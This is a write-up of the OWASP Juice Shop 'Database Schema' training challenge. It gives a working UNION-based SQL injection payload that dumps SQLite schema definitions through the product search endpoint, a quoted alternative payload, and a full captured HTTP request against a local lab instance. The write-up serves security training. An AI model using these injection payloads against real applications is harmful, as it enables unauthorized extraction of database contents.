# Database Schema

**Difficulty**: :star2::star2::star2:

**Description**: Exfiltrate the entire DB schema definition via SQL Injection.

**Category**: Injection

**Tags**:

**Solution**:

After taking a peek at the solution, I can finally extract all the database schema from SQLite:

Query string: `/rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--`

> :warning: NOTE: The query string from juice-shop [solution](https://github.com/refabr1k/owasp-juiceshop-solutions/blob/master/Level3/database-schema.md): `/rest/products/search?q=asd'))+union+select+sql,2,3,4,5,6,7,8,9+from+sqlite_master+where+type='table'--` **killed** my Docker container instantly.

<details>
<summary>Example request</summary>

```
GET /rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
Content-Length: 2285

 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ5MDExMywiZXhwIjoxNjU4NTA4MTEzfQ.b1R88nwcNHfDZPFQSQDyyVSxzwuW2S7TC7qGoIi81oKaTNl7fJH77ngvBE1I9oCrcZKB7zVlhtNhXM4iVZOkI_Zc6WWc2v04UKpSJGoqBv7Ki68GcoIJCAXAiOPG6ZFw8KWVkfR4cow5HMX4uc9bVwayJirtaaAAAU7xg3x5BQ8
Connection: keep-alive
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=b9tDIes4UzHDT6FzfpSei4frkuOmtXqiBWSl5HLRCBLSk3UlRTKwiOahX8tOOIR1Tyrs1aIvY; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ5MDExMywiZXhwIjoxNjU4NTA4MTEzfQ.b1R88nwcNHfDZPFQSQDyyVSxzwuW2S7TC7qGoIi81oKaTNl7fJH77ngvBE1I9oCrcZKB7zVlhtNhXM4iVZOkI_Zc6WWc2v04UKpSJGoqBv7Ki68GcoIJCAXAiOPG6ZFw8KWVkfR4cow5HMX4uc9bVwayJirtaaAAAU7xg3x5BQ8
DNT: 1
Host: localhost:3000
If-None-Match: W/"3250-y03qquSPAF5wuSLz49f3Ic5bcqg"
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
```

</details>

![success request](https://user-images.githubusercontent.com/64480713/180471149-1ee6d5b6-31a6-45f9-89ba-dda403572c59.png)
